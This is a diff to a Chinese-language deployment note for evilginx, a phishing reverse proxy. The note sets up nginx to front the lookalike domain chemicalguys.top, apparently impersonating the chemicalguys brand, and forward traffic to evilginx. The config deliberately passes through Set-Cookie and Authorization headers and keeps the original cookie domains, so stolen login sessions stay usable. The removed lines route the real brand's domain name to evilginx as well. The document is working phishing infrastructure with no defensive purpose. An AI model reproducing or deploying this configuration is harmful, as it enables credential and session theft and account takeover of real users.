@@ -16,41 +16,84 @@ evilginx部署
 5. cp phishlets  redirectors
 6. ./evilginx 
 
-[## nginx配置
-
-    stream {
-
-        map $ssl_preread_server_name $backend {
-            ~^(.+\.)?supercake2026\.com$   web;
-            ~^(.+\.)?chemicalguys\.com$        evilginx;
-    
-        }
-        upstream evilginx {
-            server 127.0.0.1:18443;
-        }
-        upstream web {
-            server 127.0.0.1:8443;
-        }
-    
-        server {
-            listen 443;
-            proxy_pass $backend;
-            ssl_preread on;
-            proxy_protocol on;                    # 重要！让 Evi 获取真实 IP
-            proxy_connect_timeout 10s;
-            proxy_timeout 5m;
-        }
-    }]()
-
-**注意， web服务的话要加个这个： 因为stream加了：proxy_protocol  on;**
-
+## nginx配置
     server {
-        listen       80;
-        listen      8443 ssl **proxy_protocol**;
-        server_name  web3.supercake2026.com;
+        listen 443 ssl http2;
     
-        set_real_ip_from 127.0.0.1;
-        real_ip_header **proxy_protocol**;
+        server_name chemicalguys.top *.chemicalguys.top;
+    
+        # SSL 证书（自签或正式证书）
+        ssl_certificate     /root/.evilginx/crt/sites/chemicalguys.top/fullchain.pem;
+        ssl_certificate_key /root/.evilginx/crt/sites/chemicalguys.top/privkey.pem;
+    
+        # TLS 配置
+        ssl_protocols TLSv1.2 TLSv1.3;
+        ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
+        ssl_prefer_server_ciphers on;
+        ssl_session_cache shared:SSL:10m;
+        ssl_session_timeout 10m;
+    
+        # HSTS 强制 HTTPS
+        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    
+        # 日志
+        access_log /var/log/nginx/evilginx.access.log;
+        error_log  /var/log/nginx/evilginx.error.log warn;
+    
+        # 反代到 evilginx
+        location / {
+            proxy_pass https://127.0.0.1:18443;
+    
+            # -------------------------------
+            # Host / Origin / Referer 完全保留浏览器访问域名
+            # -------------------------------
+            #proxy_set_header Host $host;
+            #proxy_set_header Origin $scheme://$host;
+            #proxy_set_header Referer $http_referer;
+            proxy_set_header Host $http_host;
+            proxy_set_header Origin $http_origin;
+            proxy_set_header Referer $http_referer;
+    
+            # -------------------------------
+            # 客户端真实 IP
+            # -------------------------------
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_set_header X-Forwarded-Proto $scheme;
+    
+            proxy_pass_header Authorization;
+            proxy_pass_header Set-Cookie;
+            # -------------------------------
+            # Cookie 保持原始 domain / path / SameSite
+            # -------------------------------
+            # 不做 proxy_cookie_domain 改写
+            # proxy_cookie_path / /;
+    
+            # -------------------------------
+            # WebSocket / HTTP/2 支持
+            # -------------------------------
+            proxy_http_version 1.1;
+            proxy_set_header Upgrade $http_upgrade;
+            proxy_set_header Connection "upgrade";
+    
+            # -------------------------------
+            # SSL 反代设置
+            # -------------------------------
+            proxy_ssl_verify off;       # evilginx 自签或 TLS
+            proxy_ssl_server_name on;
+            proxy_ssl_name $host;
+            proxy_ssl_protocols TLSv1.2 TLSv1.3;
+    
+            # -------------------------------
+            # 超时 & 缓冲
+            # -------------------------------
+            proxy_connect_timeout 30s;
+            proxy_read_timeout 90s;
+            proxy_send_timeout 90s;
+            client_max_body_size 20M;
+    
+        }
+    }
 
 
 
